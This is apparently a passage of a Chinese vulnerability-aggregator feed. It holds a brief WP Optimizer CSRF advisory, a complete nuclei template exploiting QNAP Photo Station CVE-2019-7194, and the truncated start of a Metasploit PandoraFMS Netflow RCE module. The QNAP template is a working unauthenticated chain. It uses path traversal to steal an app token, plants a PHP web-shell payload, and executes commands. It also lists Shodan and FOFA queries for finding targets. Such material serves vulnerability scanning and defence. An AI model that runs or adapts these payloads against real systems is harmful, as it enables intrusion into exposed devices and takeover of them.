    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-c3jv-8q67-qj5f">https://github.com/advisories/GHSA-c3jv-8q67-qj5f</a></p><p><strong>CVSS 评分：</strong> 9.6</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53314">https://nvd.nist.gov/vuln/detail/CVE-2025-53314</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/wp-optimizer/vulnerability/wordpress-wp-optimizer-plugin-2-3-6-cross-site-request-forgery-csrf-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/wp-optimizer/vulnerability/wordpress-wp-optimizer-plugin-2-3-6-cross-site-request-forgery-csrf-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-c3jv-8q67-qj5f">https://github.com/advisories/GHSA-c3jv-8q67-qj5f</a></p></li></ul><p><strong>描述：</strong></p><p>Cross-Site Request Forgery (CSRF) vulnerability in sh1zen WP Optimizer allows SQL Injection. This issue affects WP Optimizer: from n&#x2F;a through 2.3.6.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-c3jv-8q67-qj5f&quot;&gt;https://github.com/advisories/GHSA-c3jv-8q67-qj5f&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>QNAP Photo Station 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/27/github_3052816480/"/>
    <id>http://example.com/2025/06/27/github_3052816480/</id>
    <published>2025-06-27T15:45:37.273Z</published>
    <updated>2025-06-27T15:45:37.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> QNAP Photo Station 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-7194</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP Photo Station 6.0.3之前的版本存在多个漏洞，这些漏洞可以被串联利用，实现未经认证的远程代码执行（RCE）。其中包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感的系统文件。为了降低这些风险，QNAP强烈建议将Photo Station更新到最新可用版本。</p><p><strong>产品厂商：</strong> qnap</p><p><strong>产品名称：</strong> photo_station</p><p><strong>影响版本：</strong> &lt; 6.0.3</p><p><strong>搜索语法：</strong> title&#x3D;”photo station” || title&#x3D;”qnap”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/57e42dff4deed2cb38632bf4108674780974a7f2/http%2Fcves%2F2019%2FCVE-2019-7194.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/57e42dff4deed2cb38632bf4108674780974a7f2/http%2Fcves%2F2019%2FCVE-2019-7194.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7194</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> QNAP Photo Station <span class="hljs-operator">&lt;</span> <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> x-stp<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    QNAP Photo Station versions prior to <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE).<br>    This includes a flaw involving external control of file names <span class="hljs-keyword">or</span> paths, allowing attackers to access <span class="hljs-keyword">or</span> modify sensitive system files.<br>    To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/ARPSyndicate/cvemon</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/Ostorlab/KEV</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/cyb3r-w0lf/nuclei-template-collection</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/xbl3/awesome-cve-poc_qazbnm456</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7194</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">22</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.89163</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99497</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:qnap:photo_station:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">vendor:</span> qnap<br>    <span class="hljs-params">product:</span> photo_station<br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> content-length:<span class="hljs-string">&quot;580 &quot;</span>http server <span class="hljs-number">1.0</span><span class="hljs-string">&quot;&quot;</span><br>      <span class="hljs-operator">-</span> http.title:<span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> http.title:<span class="hljs-string">&quot;qnap&quot;</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;qnap&quot;</span><br>    <span class="hljs-params">google-query:</span><br>      <span class="hljs-operator">-</span> intitle:<span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> intitle:<span class="hljs-string">&quot;qnap&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,intrusive<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">command_payload:</span> &#x27;%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>d%<span class="hljs-number">60</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bx%<span class="hljs-number">5</span>D%<span class="hljs-number">60</span>%<span class="hljs-number">3</span>f%<span class="hljs-number">3</span>e%<span class="hljs-number">40</span>s.tp&#x27;<br>  <span class="hljs-params">dropper_command:</span> <span class="hljs-string">&quot;x= echo $((0x2C06*1337))&quot;</span><br>  <span class="hljs-params">dropper_filename:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alpha(6))&#125;&#125;&quot;</span><br>  <span class="hljs-params">username:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alphanumeric(6))&#125;&#125;&quot;</span><br>  <span class="hljs-params">email_account:</span> <span class="hljs-string">&quot;&#123;&#123;username&#125;&#125;@&#123;&#123;to_lower(rand_text_alphanumeric(6))&#125;&#125;.com&quot;</span><br>  <span class="hljs-params">email_passwd:</span> <span class="hljs-string">&quot;&#123;&#123;rand_text_alphanumeric(12)&#125;&#125;&quot;</span><br><br><span class="hljs-params">flow:</span> |<br>  http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">3</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">4</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">5</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">6</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">7</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/photo/p/api/album.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">a</span><span class="hljs-operator">=</span>setSlideshow&amp;f<span class="hljs-operator">=</span>qsamplealbum<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> album_id<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;output&gt;([a-zA-Z0-9]+)&lt;/output&gt;&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>photo<span class="hljs-operator">/</span>slideshow.php<span class="hljs-operator">?</span>album<span class="hljs-operator">=</span>&#123;&#123;album_id&#125;&#125; HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> access_code<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;encodeURIComponent<span class="hljs-char escape_">\\</span>(&#x27;([A-Za-z0-9%]+)&#x27;<span class="hljs-char escape_">\\</span>)&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">name:</span> phpsessid<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;PHPSESSID=([a-z0-9]+);&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/photo/p/api/video.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">a</span><span class="hljs-operator">=</span>caption&amp;f<span class="hljs-operator">=</span>UMGObv&amp;album<span class="hljs-operator">=</span>&#123;&#123;album_id&#125;&#125;&amp;ac<span class="hljs-operator">=</span>&#123;&#123;access_code&#125;&#125;&amp;filename<span class="hljs-operator">=</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>Multimedia<span class="hljs-operator">/</span>.@__thumb<span class="hljs-symbol">/ps.app.token</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> app_token<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;([a-f0-9]&#123;32&#125;)&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/cgi-bin/authLogin.cgi</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">app</span><span class="hljs-operator">=</span>PHOTO_STATION&amp;auth<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;app_token<span class="hljs-operator">=</span>&#123;&#123;app_token&#125;&#125;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">name:</span> nas_sid<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-symbol">&lt;authSid&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>\[CDATA\[([a-z0-<span class="hljs-number">9</span>]<span class="hljs-operator">+</span>)\]\]<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>authSid<span class="hljs-operator">&gt;</span>&#x27;<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>userConfig.cgi<span class="hljs-operator">?</span>sid<span class="hljs-operator">=</span>&#123;&#123;nas_sid&#125;&#125; HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>        <span class="hljs-params">X-Requested-With:</span> XMLHttpRequest<br><br>        <span class="hljs-attr">func</span><span class="hljs-operator">=</span>addPersonalSmtp&amp;provider_idx<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;sender<span class="hljs-operator">=</span>&#123;&#123;command_payload&#125;&#125;&amp;default<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;smtp_server<span class="hljs-operator">=</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>&amp;port<span class="hljs-operator">=</span><span class="hljs-number">25</span>&amp;security<span class="hljs-operator">=</span><span class="hljs-operator">-</span><span class="hljs-number">1</span>&amp;email_account<span class="hljs-operator">=</span>&#123;&#123;email_account&#125;&#125;&amp;email_passwd<span class="hljs-operator">=</span>&#123;&#123;email_passwd&#125;&#125;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>photo<span class="hljs-operator">/</span>slideshow.php<span class="hljs-operator">?</span>album<span class="hljs-operator">=</span>qsamplealbum HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Cookie:</span> QMS_SID<span class="hljs-operator">=</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>mnt<span class="hljs-operator">/</span>ext<span class="hljs-operator">/</span>opt<span class="hljs-operator">/</span>photostation2<span class="hljs-operator">/</span>&#123;&#123;dropper_filename&#125;&#125;.php; <span class="hljs-attr">PHPSESSID</span><span class="hljs-operator">=</span>&#123;&#123;phpsessid&#125;&#125;; <span class="hljs-attr">NAS_SID</span><span class="hljs-operator">=</span>&#123;&#123;nas_sid&#125;&#125;; <span class="hljs-attr">DESKTOP</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>; <span class="hljs-attr">CACHE</span><span class="hljs-operator">=</span>&#123;&#123;randstr&#125;&#125;;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>photo<span class="hljs-operator">/</span>&#123;&#123;dropper_filename&#125;&#125;.php HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>        <span class="hljs-params">Cookie:</span> PHPSESSID<span class="hljs-operator">=</span>&#123;&#123;phpsessid&#125;&#125;; <span class="hljs-attr">NAS_SID</span><span class="hljs-operator">=</span>&#123;&#123;nas_sid&#125;&#125;<br><br>        &#123;&#123;dropper_command&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;NASVARS&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-number">15067990</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP Photo Station 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;str</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>PandoraFMS Netflow Authenticated Remote Code Execution</title>
    <link href="http://example.com/2025/06/27/github_532550450/"/>
    <id>http://example.com/2025/06/27/github_532550450/</id>
    <published>2025-06-27T15:45:14.534Z</published>
    <updated>2025-06-27T15:45:14.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PandoraFMS Netflow Authenticated Remote Code Execution</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5306</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块利用了PandoraFMS Netflow组件中的一个命令注入漏洞。模块需要一组用户凭证来修改Netflow设置。此外，系统上必须存在Netflow二进制文件。</p><p><strong>产品厂商：</strong> PandoraFMS</p><p><strong>产品名称：</strong> PandoraFMS</p><p><strong>影响版本：</strong> version &lt; 7.0.777.10</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/37e8780a6b8415e5515a81e6671973410eebd9f1/modules%2Fexploits%2Flinux%2Fhttp%2Fpandora_fms_auth_netflow_rce.rb">https://github.com/rapid7/metasploit-framework/blob/37e8780a6b8415e5515a81e6671973410eebd9f1/modules%2Fexploits%2Flinux%2Fhttp%2Fpandora_fms_auth_netflow_rce.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  include Msf::Exploit::Remote::Tcp<br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;PandoraFMS Netflow Authenticated Remote Code Execution&#x27;</span>,<br>        <span 